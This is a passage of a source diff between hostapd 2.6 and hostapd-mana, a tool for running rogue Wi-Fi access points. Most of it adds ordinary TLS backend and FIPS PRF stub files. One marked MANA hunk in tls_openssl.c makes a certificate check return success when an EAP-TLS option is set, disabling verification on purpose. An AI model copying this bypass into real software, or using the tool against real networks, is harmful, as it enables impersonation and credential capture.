> 	/* FIX: how to do this with CryptoAPI? */
> 	return -1;
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/fips_prf_gnutls.c hostapd-mana/src/crypto/fips_prf_gnutls.c
0a1,20
> /*
>  * FIPS 186-2 PRF for libgcrypt
>  * Copyright (c) 2004-2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> #include <gcrypt.h>
> 
> #include "common.h"
> #include "crypto.h"
> 
> 
> int fips186_2_prf(const u8 *seed, size_t seed_len, u8 *x, size_t xlen)
> {
> 	/* FIX: how to do this with libgcrypt? */
> 	return -1;
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/fips_prf_nss.c hostapd-mana/src/crypto/fips_prf_nss.c
0a1,19
> /*
>  * FIPS 186-2 PRF for NSS
>  * Copyright (c) 2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> #include <openssl/sha.h>
> 
> #include "common.h"
> #include "crypto.h"
> 
> 
> int fips186_2_prf(const u8 *seed, size_t seed_len, u8 *x, size_t xlen)
> {
> 	return -1;
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/tls_nss.c hostapd-mana/src/crypto/tls_nss.c
0a1,645
> /*
>  * SSL/TLS interface functions for NSS
>  * Copyright (c) 2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> #include <nspr/prtypes.h>
> #include <nspr/plarenas.h>
> #include <nspr/plhash.h>
> #include <nspr/prio.h>
> #include <nspr/prclist.h>
> #include <nspr/prlock.h>
> #include <nspr/prinit.h>
> #include <nspr/prerror.h>
> #include <nspr/prmem.h>
> #include <nss/nss.h>
> #include <nss/nssilckt.h>
> #include <nss/ssl.h>
> #include <nss/pk11func.h>
> #include <nss/secerr.h>
> 
> #include "common.h"
> #include "tls.h"
> 
> static int tls_nss_ref_count = 0;
> 
> static PRDescIdentity nss_layer_id;
> 
> 
> struct tls_connection {
> 	PRFileDesc *fd;
> 
> 	int established;
> 	int verify_peer;
> 	u8 *push_buf, *pull_buf, *pull_buf_offset;
> 	size_t push_buf_len, pull_buf_len;
> };
> 
> 
> static PRStatus nss_io_close(PRFileDesc *fd)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O close");
> 	return PR_SUCCESS;
> }
> 
> 
> static PRInt32 nss_io_read(PRFileDesc *fd, void *buf, PRInt32 amount)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O read(%d)", amount);
> 	return PR_FAILURE;
> }
> 
> 
> static PRInt32 nss_io_write(PRFileDesc *fd, const void *buf, PRInt32 amount)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O write(%d)", amount);
> 	return PR_FAILURE;
> }
> 
> 
> static PRInt32 nss_io_writev(PRFileDesc *fd, const PRIOVec *iov,
> 			     PRInt32 iov_size, PRIntervalTime timeout)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O writev(%d)", iov_size);
> 	return PR_FAILURE;
> }
> 
> 
> static PRInt32 nss_io_recv(PRFileDesc *fd, void *buf, PRInt32 amount,
> 			   PRIntn flags, PRIntervalTime timeout)
> {
> 	struct tls_connection *conn = (struct tls_connection *) fd->secret;
> 	u8 *end;
> 
> 	wpa_printf(MSG_DEBUG, "NSS: I/O recv(%d)", amount);
> 
> 	if (conn->pull_buf == NULL) {
> 		wpa_printf(MSG_DEBUG, "NSS: No data available to be read yet");
> 		return PR_FAILURE;
> 	}
> 
> 	end = conn->pull_buf + conn->pull_buf_len;
> 	if (end - conn->pull_buf_offset < amount)
> 		amount = end - conn->pull_buf_offset;
> 	os_memcpy(buf, conn->pull_buf_offset, amount);
> 	conn->pull_buf_offset += amount;
> 	if (conn->pull_buf_offset == end) {
> 		wpa_printf(MSG_DEBUG, "%s - pull_buf consumed", __func__);
> 		os_free(conn->pull_buf);
> 		conn->pull_buf = conn->pull_buf_offset = NULL;
> 		conn->pull_buf_len = 0;
> 	} else {
> 		wpa_printf(MSG_DEBUG, "%s - %lu bytes remaining in pull_buf",
> 			   __func__,
> 			   (unsigned long) (end - conn->pull_buf_offset));
> 	}
> 	return amount;
> }
> 
> 
> static PRInt32 nss_io_send(PRFileDesc *fd, const void *buf, PRInt32 amount,
> 			   PRIntn flags, PRIntervalTime timeout)
> {
> 	struct tls_connection *conn = (struct tls_connection *) fd->secret;
> 	u8 *nbuf;
> 
> 	wpa_printf(MSG_DEBUG, "NSS: I/O %s", __func__);
> 	wpa_hexdump(MSG_MSGDUMP, "NSS: I/O send data", buf, amount);
> 
> 	nbuf = os_realloc(conn->push_buf, conn->push_buf_len + amount);
> 	if (nbuf == NULL) {
> 		wpa_printf(MSG_ERROR, "NSS: Failed to allocate memory for the "
> 			   "data to be sent");
> 		return PR_FAILURE;
> 	}
> 	os_memcpy(nbuf + conn->push_buf_len, buf, amount);
> 	conn->push_buf = nbuf;
> 	conn->push_buf_len += amount;
> 
> 	return amount;
> }
> 
> 
> static PRInt32 nss_io_recvfrom(PRFileDesc *fd, void *buf, PRInt32 amount,
> 			       PRIntn flags, PRNetAddr *addr,
> 			       PRIntervalTime timeout)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O %s", __func__);
> 	return PR_FAILURE;
> }
> 
> 
> static PRInt32 nss_io_sendto(PRFileDesc *fd, const void *buf, PRInt32 amount,
> 			     PRIntn flags, const PRNetAddr *addr,
> 			     PRIntervalTime timeout)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O %s", __func__);
> 	return PR_FAILURE;
> }
> 
> 
> static PRStatus nss_io_getpeername(PRFileDesc *fd, PRNetAddr *addr)
> {
> 	wpa_printf(MSG_DEBUG, "NSS: I/O getpeername");
> 
> 	/*
> 	 * It Looks like NSS only supports IPv4 and IPv6 TCP sockets. Provide a
> 	 * fake IPv4 address to work around this even though we are not really
> 	 * using TCP.
> 	 */
> 	os_memset(addr, 0, sizeof(*addr));
> 	addr->inet.family = PR_AF_INET;
> 
> 	return PR_SUCCESS;
> }
> 
> 
> static PRStatus nss_io_getsocketoption(PRFileDesc *fd,
> 				       PRSocketOptionData *data)
> {
> 	switch (data->option) {
> 	case PR_SockOpt_Nonblocking:
> 		wpa_printf(MSG_DEBUG, "NSS: I/O getsocketoption(Nonblocking)");
> 		data->value.non_blocking = PR_TRUE;
> 		return PR_SUCCESS;
> 	default:
> 		wpa_printf(MSG_DEBUG, "NSS: I/O getsocketoption(%d)",
> 			   data->option);
> 		return PR_FAILURE;
> 	}
> }
> 
> 
> static const PRIOMethods nss_io = {
> 	PR_DESC_LAYERED,
> 	nss_io_close,
> 	nss_io_read,
> 	nss_io_write,
> 	NULL /* available */,
> 	NULL /* available64 */,
> 	NULL /* fsync */,
> 	NULL /* fseek */,
> 	NULL /* fseek64 */,
> 	NULL /* fileinfo */,
> 	NULL /* fileinfo64 */,
> 	nss_io_writev,
> 	NULL /* connect */,
> 	NULL /* accept */,
> 	NULL /* bind */,
> 	NULL /* listen */,
> 	NULL /* shutdown */,
> 	nss_io_recv,
> 	nss_io_send,
> 	nss_io_recvfrom,
> 	nss_io_sendto,
> 	NULL /* poll */,
> 	NULL /* acceptread */,
> 	NULL /* transmitfile */,
> 	NULL /* getsockname */,
> 	nss_io_getpeername,
> 	NULL /* reserved_fn_6 */,
> 	NULL /* reserved_fn_5 */,
> 	nss_io_getsocketoption,
> 	NULL /* setsocketoption */,
> 	NULL /* sendfile */,
> 	NULL /* connectcontinue */,
> 	NULL /* reserved_fn_3 */,
> 	NULL /* reserved_fn_2 */,
> 	NULL /* reserved_fn_1 */,
> 	NULL /* reserved_fn_0 */
> };
> 
> 
> static char * nss_password_cb(PK11SlotInfo *slot, PRBool retry, void *arg)
> {
> 	wpa_printf(MSG_ERROR, "NSS: TODO - %s", __func__);
> 	return NULL;
> }
> 
> 
> void * tls_init(const struct tls_config *conf)
> {
> 	char *dir;
> 
> 	tls_nss_ref_count++;
> 	if (tls_nss_ref_count > 1)
> 		return (void *) 1;
> 
> 	PR_Init(PR_SYSTEM_THREAD, PR_PRIORITY_NORMAL, 1);
> 
> 	nss_layer_id = PR_GetUniqueIdentity("wpa_supplicant");
> 
> 	PK11_SetPasswordFunc(nss_password_cb);
> 
> 	dir = getenv("SSL_DIR");
> 	if (dir) {
> 		if (NSS_Init(dir) != SECSuccess) {
> 			wpa_printf(MSG_ERROR, "NSS: NSS_Init(cert_dir=%s) "
> 				   "failed", dir);
> 			return NULL;
> 		}
> 	} else {
> 		if (NSS_NoDB_Init(NULL) != SECSuccess) {
> 			wpa_printf(MSG_ERROR, "NSS: NSS_NoDB_Init(NULL) "
> 				   "failed");
> 			return NULL;
> 		}
> 	}
> 
> 	if (SSL_OptionSetDefault(SSL_V2_COMPATIBLE_HELLO, PR_FALSE) !=
> 	    SECSuccess ||
> 	    SSL_OptionSetDefault(SSL_ENABLE_SSL3, PR_FALSE) != SECSuccess ||
> 	    SSL_OptionSetDefault(SSL_ENABLE_SSL2, PR_FALSE) != SECSuccess ||
> 	    SSL_OptionSetDefault(SSL_ENABLE_TLS, PR_TRUE) != SECSuccess) {
> 		wpa_printf(MSG_ERROR, "NSS: SSL_OptionSetDefault failed");
> 		return NULL;
> 	}
> 
> 	if (NSS_SetDomesticPolicy() != SECSuccess) {
> 		wpa_printf(MSG_ERROR, "NSS: NSS_SetDomesticPolicy() failed");
> 		return NULL;
> 	}
> 
> 	return (void *) 1;
> }
> 
> void tls_deinit(void *ssl_ctx)
> {
> 	tls_nss_ref_count--;
> 	if (tls_nss_ref_count == 0) {
> 		if (NSS_Shutdown() != SECSuccess)
> 			wpa_printf(MSG_ERROR, "NSS: NSS_Shutdown() failed");
> 	}
> }
> 
> 
> int tls_get_errors(void *tls_ctx)
> {
> 	return 0;
> }
> 
> 
> static SECStatus nss_bad_cert_cb(void *arg, PRFileDesc *fd)
> {
> 	struct tls_connection *conn = arg;
> 	SECStatus res = SECSuccess;
> 	PRErrorCode err;
> 	CERTCertificate *cert;
> 	char *subject, *issuer;
> 
> 	err = PR_GetError();
> 	if (IS_SEC_ERROR(err))
> 		wpa_printf(MSG_DEBUG, "NSS: Bad Server Certificate (sec err "
> 			   "%d)", err - SEC_ERROR_BASE);
> 	else
> 		wpa_printf(MSG_DEBUG, "NSS: Bad Server Certificate (err %d)",
> 			   err);
> 	cert = SSL_PeerCertificate(fd);
> 	subject = CERT_NameToAscii(&cert->subject);
> 	issuer = CERT_NameToAscii(&cert->issuer);
> 	wpa_printf(MSG_DEBUG, "NSS: Peer certificate subject='%s' issuer='%s'",
> 		   subject, issuer);
> 	CERT_DestroyCertificate(cert);
> 	PR_Free(subject);
> 	PR_Free(issuer);
> 	if (conn->verify_peer)
> 		res = SECFailure;
> 
> 	return res;
> }
> 
> 
> static void nss_handshake_cb(PRFileDesc *fd, void *client_data)
> {
> 	struct tls_connection *conn = client_data;
> 	wpa_printf(MSG_DEBUG, "NSS: Handshake completed");
> 	conn->established = 1;
> }
> 
> 
> struct tls_connection * tls_connection_init(void *tls_ctx)
> {
> 	struct tls_connection *conn;
> 
> 	conn = os_zalloc(sizeof(*conn));
> 	if (conn == NULL)
> 		return NULL;
> 
> 	conn->fd = PR_CreateIOLayerStub(nss_layer_id, &nss_io);
> 	if (conn->fd == NULL) {
> 		os_free(conn);
> 		return NULL;
> 	}
> 	conn->fd->secret = (void *) conn;
> 
> 	conn->fd = SSL_ImportFD(NULL, conn->fd);
> 	if (conn->fd == NULL) {
> 		os_free(conn);
> 		return NULL;
> 	}
> 
> 	if (SSL_OptionSet(conn->fd, SSL_SECURITY, PR_TRUE) != SECSuccess ||
> 	    SSL_OptionSet(conn->fd, SSL_HANDSHAKE_AS_CLIENT, PR_TRUE) !=
> 	    SECSuccess ||
> 	    SSL_OptionSet(conn->fd, SSL_HANDSHAKE_AS_SERVER, PR_FALSE) !=
> 	    SECSuccess ||
> 	    SSL_OptionSet(conn->fd, SSL_ENABLE_TLS, PR_TRUE) != SECSuccess ||
> 	    SSL_BadCertHook(conn->fd, nss_bad_cert_cb, conn) != SECSuccess ||
> 	    SSL_HandshakeCallback(conn->fd, nss_handshake_cb, conn) !=
> 	    SECSuccess) {
> 		wpa_printf(MSG_ERROR, "NSS: Failed to set options");
> 		PR_Close(conn->fd);
> 		os_free(conn);
> 		return NULL;
> 	}
> 
> 	SSL_ResetHandshake(conn->fd, PR_FALSE);
> 
> 	return conn;
> }
> 
> 
> void tls_connection_deinit(void *tls_ctx, struct tls_connection *conn)
> {
> 	PR_Close(conn->fd);
> 	os_free(conn->push_buf);
> 	os_free(conn->pull_buf);
> 	os_free(conn);
> }
> 
> 
> int tls_connection_established(void *tls_ctx, struct tls_connection *conn)
> {
> 	return conn->established;
> }
> 
> 
> int tls_connection_shutdown(void *tls_ctx, struct tls_connection *conn)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_set_params(void *tls_ctx, struct tls_connection *conn,
> 			      const struct tls_connection_params *params)
> {
> 	wpa_printf(MSG_ERROR, "NSS: TODO - %s", __func__);
> 	return 0;
> }
> 
> 
> int tls_global_set_params(void *tls_ctx,
> 			  const struct tls_connection_params *params)
> {
> 	return -1;
> }
> 
> 
> int tls_global_set_verify(void *tls_ctx, int check_crl)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_set_verify(void *tls_ctx, struct tls_connection *conn,
> 			      int verify_peer)
> {
> 	conn->verify_peer = verify_peer;
> 	return 0;
> }
> 
> 
> int tls_connection_get_keys(void *tls_ctx, struct tls_connection *conn,
> 			    struct tls_keys *keys)
> {
> 	/* NSS does not export master secret or client/server random. */
> 	return -1;
> }
> 
> 
> int tls_connection_prf(void *tls_ctx, struct tls_connection *conn,
> 		       const char *label, int server_random_first,
> 		       u8 *out, size_t out_len)
> {
> 	if (conn == NULL || server_random_first) {
> 		wpa_printf(MSG_INFO, "NSS: Unsupported PRF request "
> 			   "(server_random_first=%d)",
> 			   server_random_first);
> 		return -1;
> 	}
> 
> 	if (SSL_ExportKeyingMaterial(conn->fd, label, NULL, 0, out, out_len) !=
> 	    SECSuccess) {
> 		wpa_printf(MSG_INFO, "NSS: Failed to use TLS extractor "
> 			   "(label='%s' out_len=%d", label, (int) out_len);
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> struct wpabuf * tls_connection_handshake(void *tls_ctx,
> 					 struct tls_connection *conn,
> 					 const struct wpabuf *in_data,
> 					 struct wpabuf **appl_data)
> {
> 	struct wpabuf *out_data;
> 
> 	wpa_printf(MSG_DEBUG, "NSS: handshake: in_len=%u",
> 		   in_data ? (unsigned int) wpabuf_len(in_data) : 0);
> 
> 	if (appl_data)
> 		*appl_data = NULL;
> 
> 	if (in_data && wpabuf_len(in_data) > 0) {
> 		if (conn->pull_buf) {
> 			wpa_printf(MSG_DEBUG, "%s - %lu bytes remaining in "
> 				   "pull_buf", __func__,
> 				   (unsigned long) conn->pull_buf_len);
> 			os_free(conn->pull_buf);
> 		}
> 		conn->pull_buf = os_malloc(wpabuf_len(in_data));
> 		if (conn->pull_buf == NULL)
> 			return NULL;
> 		os_memcpy(conn->pull_buf, wpabuf_head(in_data),
> 			  wpabuf_len(in_data));
> 		conn->pull_buf_offset = conn->pull_buf;
> 		conn->pull_buf_len = wpabuf_len(in_data);
> 	}
> 
> 	SSL_ForceHandshake(conn->fd);
> 
> 	if (conn->established && conn->push_buf == NULL) {
> 		/* Need to return something to get final TLS ACK. */
> 		conn->push_buf = os_malloc(1);
> 	}
> 
> 	if (conn->push_buf == NULL)
> 		return NULL;
> 	out_data = wpabuf_alloc_ext_data(conn->push_buf, conn->push_buf_len);
> 	if (out_data == NULL)
> 		os_free(conn->push_buf);
> 	conn->push_buf = NULL;
> 	conn->push_buf_len = 0;
> 	return out_data;
> }
> 
> 
> struct wpabuf * tls_connection_server_handshake(void *tls_ctx,
> 						struct tls_connection *conn,
> 						const struct wpabuf *in_data,
> 						struct wpabuf **appl_data)
> {
> 	return NULL;
> }
> 
> 
> struct wpabuf * tls_connection_encrypt(void *tls_ctx,
> 				       struct tls_connection *conn,
> 				       const struct wpabuf *in_data)
> {
> 	PRInt32 res;
> 	struct wpabuf *buf;
> 
> 	wpa_printf(MSG_DEBUG, "NSS: encrypt %d bytes",
> 		   (int) wpabuf_len(in_data));
> 	res = PR_Send(conn->fd, wpabuf_head(in_data), wpabuf_len(in_data), 0,
> 		      0);
> 	if (res < 0) {
> 		wpa_printf(MSG_ERROR, "NSS: Encryption failed");
> 		return NULL;
> 	}
> 	if (conn->push_buf == NULL)
> 		return NULL;
> 	buf = wpabuf_alloc_ext_data(conn->push_buf, conn->push_buf_len);
> 	if (buf == NULL)
> 		os_free(conn->push_buf);
> 	conn->push_buf = NULL;
> 	conn->push_buf_len = 0;
> 	return buf;
> }
> 
> 
> struct wpabuf * tls_connection_decrypt(void *tls_ctx,
> 				       struct tls_connection *conn,
> 				       const struct wpabuf *in_data)
> {
> 	PRInt32 res;
> 	struct wpabuf *out;
> 
> 	wpa_printf(MSG_DEBUG, "NSS: decrypt %d bytes",
> 		   (int) wpabuf_len(in_data));
> 	if (conn->pull_buf) {
> 		wpa_printf(MSG_DEBUG, "%s - %lu bytes remaining in "
> 			   "pull_buf", __func__,
> 			   (unsigned long) conn->pull_buf_len);
> 		os_free(conn->pull_buf);
> 	}
> 	conn->pull_buf = os_malloc(wpabuf_len(in_data));
> 	if (conn->pull_buf == NULL)
> 		return NULL;
> 	os_memcpy(conn->pull_buf, wpabuf_head(in_data), wpabuf_len(in_data));
> 	conn->pull_buf_offset = conn->pull_buf;
> 	conn->pull_buf_len = wpabuf_len(in_data);
> 
> 	/*
> 	 * Even though we try to disable TLS compression, it is possible that
> 	 * this cannot be done with all TLS libraries. Add extra buffer space
> 	 * to handle the possibility of the decrypted data being longer than
> 	 * input data.
> 	 */
> 	out = wpabuf_alloc((wpabuf_len(in_data) + 500) * 3);
> 	if (out == NULL)
> 		return NULL;
> 
> 	res = PR_Recv(conn->fd, wpabuf_mhead(out), wpabuf_size(out), 0, 0);
> 	wpa_printf(MSG_DEBUG, "NSS: PR_Recv: %d", res);
> 	if (res < 0) {
> 		wpabuf_free(out);
> 		return NULL;
> 	}
> 	wpabuf_put(out, res);
> 
> 	return out;
> }
> 
> 
> int tls_connection_resumed(void *tls_ctx, struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_set_cipher_list(void *tls_ctx, struct tls_connection *conn,
> 				   u8 *ciphers)
> {
> 	return -1;
> }
> 
> 
> int tls_get_cipher(void *tls_ctx, struct tls_connection *conn,
> 		   char *buf, size_t buflen)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_enable_workaround(void *tls_ctx,
> 				     struct tls_connection *conn)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_client_hello_ext(void *tls_ctx, struct tls_connection *conn,
> 				    int ext_type, const u8 *data,
> 				    size_t data_len)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_get_failed(void *tls_ctx, struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_get_read_alerts(void *tls_ctx, struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_get_write_alerts(void *tls_ctx,
> 				    struct tls_connection *conn)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_get_keyblock_size(void *tls_ctx,
> 				     struct tls_connection *conn)
> {
> 	return -1;
> }
> 
> 
> unsigned int tls_capabilities(void *tls_ctx)
> {
> 	return 0;
> }
> 
> 
> int tls_connection_set_session_ticket_cb(void *tls_ctx,
> 					 struct tls_connection *conn,
> 					 tls_session_ticket_cb cb,
> 					 void *ctx)
> {
> 	return -1;
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/tls_openssl.c hostapd-mana/src/crypto/tls_openssl.c
39a40
> #include "common/mana.h" //MANA
1775a1777,1780
> 	//START MANA
> 	if (mana.conf->mana_eaptls)
> 		return 1;
> 	//END MANA
diff '--color=auto' -rN hostapd-2.6/src/crypto/tls_schannel.c hostapd-mana/src/crypto/tls_schannel.c
0a1,732
> /*
>  * SSL/TLS interface functions for Microsoft Schannel
>  * Copyright (c) 2005-2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> /*
>  * FIX: Go through all SSPI functions and verify what needs to be freed
>  * FIX: session resumption
>  * TODO: add support for server cert chain validation
>  * TODO: add support for CA cert validation
>  * TODO: add support for EAP-TLS (client cert/key conf)
>  */
> 
> #include "includes.h"
> #include <windows.h>
> #include <wincrypt.h>
> #include <schannel.h>
> #define SECURITY_WIN32
> #include <security.h>
> #include <sspi.h>
> 
> #include "common.h"
> #include "tls.h"
> 
> 
> struct tls_global {
> 	HMODULE hsecurity;
> 	PSecurityFunctionTable sspi;
> 	HCERTSTORE my_cert_store;
> };
> 
> struct tls_connection {
> 	int established, start;
> 	int failed, read_alerts, write_alerts;
> 
> 	SCHANNEL_CRED schannel_cred;
> 	CredHandle creds;
> 	CtxtHandle context;
> 
> 	u8 eap_tls_prf[128];
> 	int eap_tls_prf_set;
> };
> 
> 
> static int schannel_load_lib(struct tls_global *global)
> {
> 	INIT_SECURITY_INTERFACE pInitSecurityInterface;
> 
> 	global->hsecurity = LoadLibrary(TEXT("Secur32.dll"));
> 	if (global->hsecurity == NULL) {
> 		wpa_printf(MSG_ERROR, "%s: Could not load Secur32.dll - 0x%x",
> 			   __func__, (unsigned int) GetLastError());
> 		return -1;
> 	}
> 
> 	pInitSecurityInterface = (INIT_SECURITY_INTERFACE) GetProcAddress(
> 		global->hsecurity, "InitSecurityInterfaceA");
> 	if (pInitSecurityInterface == NULL) {
> 		wpa_printf(MSG_ERROR, "%s: Could not find "
> 			   "InitSecurityInterfaceA from Secur32.dll",
> 			   __func__);
> 		FreeLibrary(global->hsecurity);
> 		global->hsecurity = NULL;
> 		return -1;
> 	}
> 
> 	global->sspi = pInitSecurityInterface();
> 	if (global->sspi == NULL) {
> 		wpa_printf(MSG_ERROR, "%s: Could not read security "
> 			   "interface - 0x%x",
> 			   __func__, (unsigned int) GetLastError());
> 		FreeLibrary(global->hsecurity);
> 		global->hsecurity = NULL;
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> void * tls_init(const struct tls_config *conf)
> {
> 	struct tls_global *global;
> 
> 	global = os_zalloc(sizeof(*global));
> 	if (global == NULL)
> 		return NULL;
> 	if (schannel_load_lib(global)) {
> 		os_free(global);
> 		return NULL;
> 	}
> 	return global;
> }
> 
> 
> void tls_deinit(void *ssl_ctx)
> {
> 	struct tls_global *global = ssl_ctx;
> 
> 	if (global->my_cert_store)
> 		CertCloseStore(global->my_cert_store, 0);
> 	FreeLibrary(global->hsecurity);
> 	os_free(global);
> }
> 
> 
> int tls_get_errors(void *ssl_ctx)
> {
> 	return 0;
> }
> 
> 
> struct tls_connection * tls_connection_init(void *ssl_ctx)
> {
> 	struct tls_connection *conn;
> 
> 	conn = os_zalloc(sizeof(*conn));
> 	if (conn == NULL)
> 		return NULL;
> 	conn->start = 1;
> 
> 	return conn;
> }
> 
> 
> void tls_connection_deinit(void *ssl_ctx, struct tls_connection *conn)
> {
> 	if (conn == NULL)
> 		return;
> 
> 	os_free(conn);
> }
> 
> 
> int tls_connection_established(void *ssl_ctx, struct tls_connection *conn)
> {
> 	return conn ? conn->established : 0;
> }
> 
> 
> int tls_connection_shutdown(void *ssl_ctx, struct tls_connection *conn)
> {
> 	struct tls_global *global = ssl_ctx;
> 	if (conn == NULL)
> 		return -1;
> 
> 	conn->eap_tls_prf_set = 0;
> 	conn->established = conn->failed = 0;
> 	conn->read_alerts = conn->write_alerts = 0;
> 	global->sspi->DeleteSecurityContext(&conn->context);
> 	/* FIX: what else needs to be reseted? */
> 
> 	return 0;
> }
> 
> 
> int tls_global_set_params(void *tls_ctx,
> 			  const struct tls_connection_params *params)
> {
> 	return -1;
> }
> 
> 
> int tls_global_set_verify(void *ssl_ctx, int check_crl)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_set_verify(void *ssl_ctx, struct tls_connection *conn,
> 			      int verify_peer)
> {
> 	return -1;
> }
> 
> 
> int tls_connection_get_keys(void *ssl_ctx, struct tls_connection *conn,
> 			    struct tls_keys *keys)
> {
> 	/* Schannel does not export master secret or client/server random. */
> 	return -1;
> }
> 
> 
> int tls_connection_prf(void *tls_ctx, struct tls_connection *conn,
> 		       const char *label, int server_random_first,
> 		       u8 *out, size_t out_len)
> {
> 	/*
> 	 * Cannot get master_key from Schannel, but EapKeyBlock can be used to
> 	 * generate session keys for EAP-TLS and EAP-PEAPv0. EAP-PEAPv2 and
> 	 * EAP-TTLS cannot use this, though, since they are using different
> 	 * labels. The only option could be to implement TLSv1 completely here
> 	 * and just use Schannel or CryptoAPI for low-level crypto
> 	 * functionality..
> 	 */
> 
> 	if (conn == NULL || !conn->eap_tls_prf_set || server_random_first ||
> 	    os_strcmp(label, "client EAP encryption") != 0 ||
> 	    out_len > sizeof(conn->eap_tls_prf))
> 		return -1;
> 
> 	os_memcpy(out, conn->eap_tls_prf, out_len);
> 
> 	return 0;
> }
> 
> 
> static struct wpabuf * tls_conn_hs_clienthello(struct tls_global *global,
> 					       struct tls_connection *conn)
> {
> 	DWORD sspi_flags, sspi_flags_out;
> 	SecBufferDesc outbuf;
> 	SecBuffer outbufs[1];
> 	SECURITY_STATUS status;
> 	TimeStamp ts_expiry;
> 
> 	sspi_flags = ISC_REQ_REPLAY_DETECT |
> 		ISC_REQ_CONFIDENTIALITY |
> 		ISC_RET_EXTENDED_ERROR |
> 		ISC_REQ_ALLOCATE_MEMORY |
> 		ISC_REQ_MANUAL_CRED_VALIDATION;
> 
> 	wpa_printf(MSG_DEBUG, "%s: Generating ClientHello", __func__);
> 
> 	outbufs[0].pvBuffer = NULL;
> 	outbufs[0].BufferType = SECBUFFER_TOKEN;
> 	outbufs[0].cbBuffer = 0;
> 
> 	outbuf.cBuffers = 1;
> 	outbuf.pBuffers = outbufs;
> 	outbuf.ulVersion = SECBUFFER_VERSION;
> 
> #ifdef UNICODE
> 	status = global->sspi->InitializeSecurityContextW(
> 		&conn->creds, NULL, NULL /* server name */, sspi_flags, 0,
> 		SECURITY_NATIVE_DREP, NULL, 0, &conn->context,
> 		&outbuf, &sspi_flags_out, &ts_expiry);
> #else /* UNICODE */
> 	status = global->sspi->InitializeSecurityContextA(
> 		&conn->creds, NULL, NULL /* server name */, sspi_flags, 0,
> 		SECURITY_NATIVE_DREP, NULL, 0, &conn->context,
> 		&outbuf, &sspi_flags_out, &ts_expiry);
> #endif /* UNICODE */
> 	if (status != SEC_I_CONTINUE_NEEDED) {
> 		wpa_printf(MSG_ERROR, "%s: InitializeSecurityContextA "
> 			   "failed - 0x%x",
> 			   __func__, (unsigned int) status);
> 		return NULL;
> 	}
> 
> 	if (outbufs[0].cbBuffer != 0 && outbufs[0].pvBuffer) {
> 		struct wpabuf *buf;
> 		wpa_hexdump(MSG_MSGDUMP, "SChannel - ClientHello",
> 			    outbufs[0].pvBuffer, outbufs[0].cbBuffer);
> 		conn->start = 0;
> 		buf = wpabuf_alloc_copy(outbufs[0].pvBuffer,
> 					outbufs[0].cbBuffer);
> 		if (buf == NULL)
> 			return NULL;
> 		global->sspi->FreeContextBuffer(outbufs[0].pvBuffer);
> 		return buf;
> 	}
> 
> 	wpa_printf(MSG_ERROR, "SChannel: Failed to generate ClientHello");
> 
> 	return NULL;
> }
> 
> 
> #ifndef SECPKG_ATTR_EAP_KEY_BLOCK
> #define SECPKG_ATTR_EAP_KEY_BLOCK 0x5b
> 
> typedef struct _SecPkgContext_EapKeyBlock {
> 	BYTE rgbKeys[128];
> 	BYTE rgbIVs[64];
> } SecPkgContext_EapKeyBlock, *PSecPkgContext_EapKeyBlock;
> #endif /* !SECPKG_ATTR_EAP_KEY_BLOCK */
> 
> static int tls_get_eap(struct tls_global *global, struct tls_connection *conn)
> {
> 	SECURITY_STATUS status;
> 	SecPkgContext_EapKeyBlock kb;
> 
> 	/* Note: Windows NT and Windows Me/98/95 do not support getting
> 	 * EapKeyBlock */
> 
> 	status = global->sspi->QueryContextAttributes(
> 		&conn->context, SECPKG_ATTR_EAP_KEY_BLOCK, &kb);
> 	if (status != SEC_E_OK) {
> 		wpa_printf(MSG_DEBUG, "%s: QueryContextAttributes("
> 			   "SECPKG_ATTR_EAP_KEY_BLOCK) failed (%d)",
> 			   __func__, (int) status);
> 		return -1;
> 	}
> 
> 	wpa_hexdump_key(MSG_MSGDUMP, "Schannel - EapKeyBlock - rgbKeys",
> 			kb.rgbKeys, sizeof(kb.rgbKeys));
> 	wpa_hexdump_key(MSG_MSGDUMP, "Schannel - EapKeyBlock - rgbIVs",
> 			kb.rgbIVs, sizeof(kb.rgbIVs));
> 
> 	os_memcpy(conn->eap_tls_prf, kb.rgbKeys, sizeof(kb.rgbKeys));
> 	conn->eap_tls_prf_set = 1;
> 	return 0;
> }
> 
> 
> struct wpabuf * tls_connection_handshake(void *tls_ctx,
> 					 struct tls_connection *conn,
> 					 const struct wpabuf *in_data,
> 					 struct wpabuf **appl_data)
> {
> 	struct tls_global *global = tls_ctx;
> 	DWORD sspi_flags, sspi_flags_out;
> 	SecBufferDesc inbuf, outbuf;
> 	SecBuffer inbufs[2], outbufs[1];
> 	SECURITY_STATUS status;
> 	TimeStamp ts_expiry;
> 	struct wpabuf *out_buf = NULL;
> 
> 	if (appl_data)
> 		*appl_data = NULL;
> 
> 	if (conn->start)
> 		return tls_conn_hs_clienthello(global, conn);
> 
